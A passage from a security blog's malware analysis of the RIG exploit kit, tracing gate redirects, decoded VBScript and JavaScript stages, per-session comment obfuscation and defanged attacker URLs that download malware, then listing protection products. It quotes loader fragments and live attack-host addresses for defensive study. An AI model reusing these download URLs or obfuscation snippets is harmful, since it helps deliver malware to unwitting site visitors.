+<p>The variable values look different to the ones above, but after decoding them, they end up in almost the same malicious scripts like we have seen above.</p><h3 id="first-base64-variable-s-again-vbscript">First Base64 variable "s" (again, VBscript):&nbsp;</h3><p>You can see below, the session ID changed in the URL the rest is more or less the same.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-bTxDJXP6hd8/WBnj7i0TfCI/AAAAAAAAAjs/KxkhmJ2v6TsF_yxxL1fp6WWz8frKSZQSQCEw/s1600/17a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="368" src="https://4.bp.blogspot.com/-bTxDJXP6hd8/WBnj7i0TfCI/AAAAAAAAAjs/KxkhmJ2v6TsF_yxxL1fp6WWz8frKSZQSQCEw/s640/17a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. V (truncated for better readability)</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<h3 id="second-variable-s-again-almost-the-same-javascript-like-above">Second variable "s" (again, almost the same JavaScript like above):</h3><p>Same for the second one. The URL is again a bit different (session id), but it is the same malicious SWF file, even if the&nbsp;<em>iddqd&nbsp;</em>parameter is different, it is downloading the same malicious malware at the end like we have seen in the first stage.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-ModfBcZ60nA/WBnlsyXuqLI/AAAAAAAAAj4/dFVXVK98kqcawEusNyUp8XgsC82Cu08HQCLcB/s1600/18a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="342" src="https://4.bp.blogspot.com/-ModfBcZ60nA/WBnlsyXuqLI/AAAAAAAAAj4/dFVXVK98kqcawEusNyUp8XgsC82Cu08HQCLcB/s640/18a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. W (truncated for better readability)</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<h3 id="third-variable-s-and-again-javascript">Third variable "s" (and again, JavaScript):</h3><p>Same for the third one, we are seeing our friend function&nbsp;<em>ty()&nbsp;</em>again, just the content is adapted to the new session.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://1.bp.blogspot.com/-vI2lOvoUvuY/WBnoURddfoI/AAAAAAAAAkE/3C7Im4eOdp4gPNKhg6FeHsSV9RrcNn1VQCLcB/s1600/19a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="314" src="https://1.bp.blogspot.com/-vI2lOvoUvuY/WBnoURddfoI/AAAAAAAAAkE/3C7Im4eOdp4gPNKhg6FeHsSV9RrcNn1VQCLcB/s640/19a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. X (truncated for better readability)</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>This shows all three files are pretty much the same files from a functional perspective, like the ones which we have seen in the previous stage. The main reason they look different in their obfuscated version is that the EK inserts random comments into the JS code as discussed above. You can see some examples below:<br><br>Same JavaScript code, different random comments:<br><br><strong>Stage 1:</strong><br><br><em>/*sdfgkdfhd<strong>20708</strong>hfjfs*//*kj<strong>24459</strong>sdfjdk71976fg*/function u1(e){return unescape(e)}function p1(e){return parseInt(e,16)}</em><br><br><strong>Stage 2:</strong><br><br><em>/*sdfgkdfhd<strong>83247</strong>hfjfs*//*kj<strong>10036</strong>sdfjdk60483fg*/function u1(e){return unescape(e)}function p1(e){return parseInt(e,16)}</em><br><br>The other minor difference is something which looks like session numbers. E.g.<br><br><strong>Stage 1:</strong><br><br><em>Dim gds, jht, ytr<br><br>gds = "hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>ePf7KfLx7HA4I</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEwi_SxUjJ8kvzFuw"<br><br>jht = tra(7) &amp; ".exe"</em><br><br><strong>Stage 2:</strong><br><br><em>Dim gds, jht, ytr<br><br>gds = "hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>iKfrGbJRvMDYA</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEwi_SxUjJ8kvzFuw"<br><br>jht = tra(7) &amp; ".exe"</em><br><br>The rest of the functional code is the same. It also results in downloading the same malware files like the ones we have seen above.</p><h2 id="network-overview">Network overview</h2><p>To give you an overview of what this looks like on a network, see the summary below.<br><br>User visits infected site:<br><br><strong>Downloads Flash file (SWF)&nbsp;</strong>from ElTest Gate:<br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm</em><br><br>Flash file (SWF) creates malicious&nbsp;<strong>IFRAME(s)</strong>&nbsp;which downloads:<br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm/<strong>asd.jpg</strong></em><br><br>and a bit later (after timer times out):<br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm/<strong>rqqjllfd.html<br><br>asd.jpg</strong></em>&nbsp;is a non-obfuscated HTML file, redirecting to:<br><em>document.location.href = "hxxp://dsa.FAITHFULBUSINESSVENTURES.COM/?zn<strong>iKfrGbJRvMDYA</strong>=l3SKfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFd";</em><br><br>this loads the large HTML file including the three variables (s) mentioned in the technical details section. This might be diffrent in other campaigns e.g. two VBscripts and one SWF for example.<br><br><em>s(1) Base64 blob1 – Vbscript → downloads malware<br>s(2) Base64 blob2 – JS downloads → SWF → downloads malware<br>s(3) Base64 blob3 – JS → downloads malware<br><br><strong>rqqjlld.html</strong><strong>&nbsp;</strong></em>is a similar non-obfuscated HTML file, which redirects to:<br><em>document.location.href = "hxxp://dsa.FAITHFULBUSINESSVENTURES.COM/?zn<strong>ePf7KfLx7HA4I</strong>=l3SKfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFd";</em><br><br>this is another HTML file similar to the one above including again the three variables (s)<br><br>s(1) Base64 blob1 – Vbscript → downloads malware<br>s(2) Base64 blob2 – JS downloads → SWF → downloads malware<br>s(3) Base64 blob3 – JS → downloads malware<br><br>Let’s see what the scripts in the three s variables are doing:<br><br><strong>Stage 1. Var S(1) b64 blob Vbscript</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>iKfrGbJRvMDYA</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEwi_SxUjJ8kvzFuw</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;<br><br><strong>Stage 2. Var S(1) b64 blob VBscript:</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>ePf7KfLx7HA4I</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEwi_SxUjJ8kvzFuw</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;<br><br><strong>Stage 1. Var S(2) JS:</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>iKfrGbJRvMDYA</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBxFlvbJN0sohfQDmK1JDEqi_66QDp-1g</em><br><br><strong>Stage 2. Var S(2) JS:</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>ePf7KfLx7HA4I</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBxFlvbJN0sohfQDmK1JDEqi_GzRDh-1g</em><br><br>Both are downloading the Flash file (SWF) with MD5 c6014a32cc06f862ea44db720dfcf553, but are using slightly different iddqd variables.<br><br><strong>Stage 1. Var S(2) downloaded SWF</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>iKfrGbJRvMDYA</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_-7SDl9kKM&amp;dfgsdf=202</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;<br><br><strong>Stage 2. Var S(2) downloaded SWF</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>ePf7KfLx7HA4I</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_-_Rjt8kKM&amp;dfgsdf=293</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;<br><br><strong>Stage 1. Var S(3) JS</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>iKfrGbJRvMDYA</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_CyS3Y&amp;dfgsdf=169</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;<br><br><strong>Stage 2. Var S(3) JS</strong><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zn<strong>ePf7KfLx7HA4I</strong>=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_a6S3Y&amp;dfgsdf=169</em><br><br>Downloads &lt;final malware e.g. ransomware&gt;</p><h2 id="summary">Summary</h2><p>We have seen that the adversaries behind the RIG campaign are using gates to redirect their victims to their Exploit Kit. This makes it difficult to follow the whole infection chain and inserts another layer of obfuscation. They are combining different web technologies (e.g. JavaScript, Flash, VBscript) to obfuscate the attack and make it more difficult to reverse engineer and determine how the attack progresses to completion. By changing comment sections in their code per session and by using dynamically changing encoding and encryption for all files transmitted over the wire, they make sure that the scripts are looking different for every session, and ensures they can’t be detected by simple string matches or hash values. The tools and techniques used are giving threat actors extended flexibility to change certain parts of the infection chain on demand.</p><h2 id="protecting-users">Protecting Users</h2><p>Additional ways our customers can detect and block this threat are listed below.<br></p><figure class="kg-card kg-image-card"><a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#"><img src="https://2.bp.blogspot.com/-zLCEa9KO18g/WBnuD2ICkzI/AAAAAAAAAkU/XBGCO4W40P4nFD7nwdi_Etdyi_eVk151ACLcB/s1600/coverage.png" class="kg-image" alt="" loading="lazy"></a></figure><p>Advanced Malware Protection (<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">AMP</a>) is ideally suited to prevent the execution of the malware used by these threat actors.<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">&nbsp;CWS</a>&nbsp;or&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">WSA</a>&nbsp;web scanning prevents access to malicious websites and detects malware used in these attacks. The Network Security protection of&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">IPS</a>&nbsp;and&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">NGFW</a>&nbsp;have up-to-date signatures to detect malicious network activity by threat actors.<br><br><a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">ESA</a>&nbsp;can block malicious emails sent by threat actors as part of their campaign.</p>
+            
+                    </div>
+    </section>
+    <div class="social-media-wrapper">
+    <h5>Share this post</h5>
+    <ul class="social-media-share-list">
+        <li>
+            <a class="share-facebook" title="Share this on Facebook" data-text="Take the RIG Pill: Down the Rabbit Hole" data-href="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/" rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"></a>
+        </li>
+        <li>
+            <a class="share-x" title="Post This" data-text="Take the RIG Pill: Down the Rabbit Hole" data-href="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/" rel="nofollow" target="_blank" href="https://x.com/share?url=https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"></a>
+        </li>
+        <li>
+            <a class="share-linkedin" title="Share this on LinkedIn" data-text="Take the RIG Pill: Down the Rabbit Hole" data-href="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/" rel="nofollow" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"></a>
+        </li>
+        <li>
+            <a class="share-reddit" title="Reddit This" data-text="Take the RIG Pill: Down the Rabbit Hole" data-href="https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/" rel="nofollow" target="_blank" href="https://www.reddit/submit?url=https://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"></a>
+        </li>
+        <li>
+            <a class="share-email" title="Email This" href="mailto:?body=Take the RIG Pill: Down the Rabbit Holehttps://blog.talosintelligence.com/take-the-rig-pill-down-the-rabbit-hole/"></a>
+        </li>
+    </ul>
+</div></article>
+                    </div>
+                </div>
+                <div class="alt-layout-row-dk sidebar" id="side-bar">
+
+
+                            <h4>Related Content</h4>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/">
+                                        <h3>China-nexus UAT-11587 targets government and policy organizations across Asia with Antino backdoor</h3>
+                                        <span  class="preview-attributes">September 30, 2026 06:00</span>
+                                        <p>Cisco Talos uncovered a cluster of activity we track as UAT-11587 targeting government and policy organizations across Asia, including in Taiwan, India, the Philippines, and Cambodia, to deliver a previously undocumented backdoor referred to as “Antino” in developer artifacts.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/the-closed-quorum-inside-the-first-reported-autonomous-ai-c2-implant/">
+                                        <h3>The Closed Quorum: Inside the first reported autonomous AI C2 implant</h3>
+                                        <span  class="preview-attributes">September 22, 2026 06:00</span>
+                                        <p>CLOSEDQUORUM, a malware binary discovered through Cisco Talos’ CAIRN project, exhibits fully autonomous command and control (C2). It represents a shift in effort displacement for attackers, in which expanding portions of the attack chain can be executed without operator involvement.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/ransomware-incidents-in-japan-in-the-first-half-of-2026/">
+                                        <h3>Ransomware incidents in Japan in the first half of 2026: Investigation of The Gentlemen’s infrastructure and evidence of Qilin&#x27;s AI use</h3>
+                                        <span  class="preview-attributes">September 17, 2026 06:00</span>
+                                        <p>Ransomware incidents in Japan rose 4.7% year over year. The Gentlemen was the most active group, with leak-site listings more than doubling from January to July. Qilin ranked second and appeared to use AI, while SMEs with capital under JPY 1 billion represented 80% of victims.</p>
+                                    </a>
+                                </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+
+    <footer id="footer">
+    <div class="container-fluid px-0">
+        <div class="row footer_nav_wrapper mx-0">
+            <div class="col-xl-10 col-12">
+                <div class="multi-col-list-wrapper">
+                    <ul class="footer-parent-list">
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/reputation">Intelligence Center</a></h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
+                                <li><a href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/vulnerability_info">Vulnerability Research</a></h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                                <li><a href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                             <ul>
+                                <li>
+                                    <h6><a href="https://talosintelligence.com/incident_response">Incident Response</a></h6>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a>
+                                </li>
+                                <li>
+                                    <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Security Resources</h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/software">Open Source Security Tools</a></li>
+                                <li><a href="https://talosintelligence.com/categories">Intelligence Categories Reference</a></li>
+                                <li><a href="https://talosintelligence.com/secure-endpoint-naming">Secure Endpoint Naming Reference</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Media</h6>
+                                </li>
+                                <li><a href="https://blog.talosintelligence.com">Talos Intelligence Blog</a></li>
+                                <li><a href="https://blog.talosintelligence.com/category/threat-source-newsletter/">Threat Source Newsletter</a></li>
+                                <li><a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos Podcast</a></li>
+                                <li><a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes Podcast</a></li>
+                                <li><a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured">Talos Videos</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Support</h6>
+                                </li>
+                                <li><a href="https://support.talosintelligence.com">Support Documentation</a></li>
+                            </ul>
+                        </li>
+                        <li class="footer-links-group">
+                            <ul>
+                                <li>
+                                    <h6>Company</h6>
+                                </li>
+                                <li><a href="https://talosintelligence.com/about">About Talos</a></li>
+                                <li><a href="https://talosintelligence.com/careers">Careers</a></li>
+                                <li><a target="_blank" href="https://www.cisco.com/c/en/us/products/security/product-listing.html">Cisco Security</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-xl-2 col-12 connect_social">
+                <div class="connect-footer-section-wrapper">
+                    <h6>Follow us</h6>
+                    <ul>
+                        <li>
+                            <a target="_blank" href="https://x.com/talossecurity"><div class="footer-media-icon" id="footer-media-icon-x"></div>
+                            </a></li>
+                        <li>
+                            <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><div class="footer-media-icon" id="footer-media-icon-youtube"></div>
+                            </a></li>
+                        <li>
+                            <a target="_blank" href="https://www.linkedin.com/company/cisco-talos-intelligence-group/"><div class="footer-media-icon" id="footer-media-icon-linkedin"></div>
+                            </a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="row mx-0">
+            <div class="col-12 footer_corporate">
+                <a target="_blank" href="http://tools.cisco.com/security/center/home.x"><img alt="Cisco" src="https://blog.talosintelligence.com/assets/images/logo_cisco_white.svg">
+                </a><p class="copyright">
+                ©
+                <span id='current-year'></span>
+                Cisco Systems, Inc. and/or its affiliates. All rights
+                reserved. View our
+                <a target="_blank" class="underline" href="http://www.cisco.com/web/siteassets/legal/privacy_full.html">Privacy Policy.</a>
+            </p>
+            </div>
+        </div>
+    </div>
+</footer>
+    <script>
+  function coverageView() {
+    const coverageTable = document.getElementById('coverage-block');
+    const sidebar = document.getElementById('side-bar');
+    const postContent = document.getElementById('post-content');
+    const currentWidth = window.innerWidth;  
+  
+    if (coverageTable && sidebar && postContent) {
+      if (currentWidth < 1000) {
+        // For viewport less than 1000px, append to post content
+        postContent.appendChild(coverageTable);
+      } else {
+        // For viewport 1000px and wider, check for subscribe button
+        const subscribeButton = sidebar.querySelector('.subscribe-button');
+        
+        if (subscribeButton) {
+          // Insert coverage block after the subscribe button
+          subscribeButton.insertAdjacentElement('afterend', coverageTable);
+        } else {
+          // No subscribe button found, prepend to top of sidebar
+          sidebar.prepend(coverageTable);
+        }
+      }
+    }
+  }
+  
+  window.addEventListener("resize", coverageView);
+  window.addEventListener("load", coverageView);
+
+
+  (function() {
+    Array.from(document.querySelectorAll("a")).filter(a => {
+        return a.hostname && a.hostname !== location.hostname
+    }).forEach(a => a.setAttribute('target', '_blank'))
+})();
+</script>
+
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="https://blog.talosintelligence.com/assets/js/jquery-3.6.0.min.js?v=_xUj-3OJU5yExlq6"></script>
+<script src="https://blog.talosintelligence.com/assets/js/popper.min.js?v=ZvOgfh-ptkpoa2Y4"></script>
+<script src="https://blog.talosintelligence.com/assets/js/resize-styles.js?v=iB-0rQKwd6f_Dllp"></script>
+<script src="https://blog.talosintelligence.com/assets/js/bootstrap.bundle.min.js?v=JRXjfu4x9e89ZZsh"></script>
+<script src="https://blog.talosintelligence.com/assets/js/date.js?v=TlJWK1qtzFQeV9lL"></script>
+<script src="https://blog.talosintelligence.com/assets/js/prism.js?v=roQly8fYXhzQ4Osd"></script>
+<script src="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/js/ghost-theme-utils.min.js" async defer></script>
+<script src="https://blog.talosintelligence.com/assets/js/chart.min.js?v=dEAdc43T4D7l37O2"></script>
+<script src="https://blog.talosintelligence.com/assets/js/x-scroll.js?v=DuV8f5nlfWlGIAUr"></script>
+<script src="https://blog.talosintelligence.com/assets/js/2025_yir_chart.js?v=OSqUj45x6XXKWbZW"></script>
+
+
+</body>
+
+</html>
